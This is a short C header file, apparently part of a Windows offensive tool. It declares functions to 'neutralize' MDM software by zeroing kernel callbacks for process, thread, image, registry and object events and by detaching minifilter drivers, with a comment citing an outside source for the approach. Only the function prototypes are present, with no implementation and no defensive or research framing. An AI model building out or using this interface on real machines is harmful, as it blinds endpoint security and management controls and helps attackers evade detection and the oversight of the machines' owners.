#ifndef MDM_NEUTRALIZATION_H
#define MDM_NEUTRALIZATION_H

#include "mdm_detection.h"
#include <windows.h>
#include <stdbool.h>

// Function prototypes for MDM neutralization
int zero_mdm_callbacks(mdm_detection_result_t* mdm_info);
int locate_mdm_callbacks(const char* mdm_name, PVOID* callback_addresses, int max_callbacks);
int zero_callback_pointer(PVOID callback_address);
int detach_mdm_minifilter(const char* driver_name);
int neutralize_mdm_software(mdm_detection_result_t* mdm_info);

// PE5 kernel callback zeroing functions (adapted from W-SLAM)
int pe5_zero_all_callbacks(void);
int pe5_zero_process_callbacks(void);
int pe5_zero_thread_callbacks(void);
int pe5_zero_image_callbacks(void);
int pe5_zero_registry_callbacks(void);
int pe5_zero_object_callbacks(void);
int pe5_detach_minifilter(const char* driver_name);

#endif // MDM_NEUTRALIZATION_H
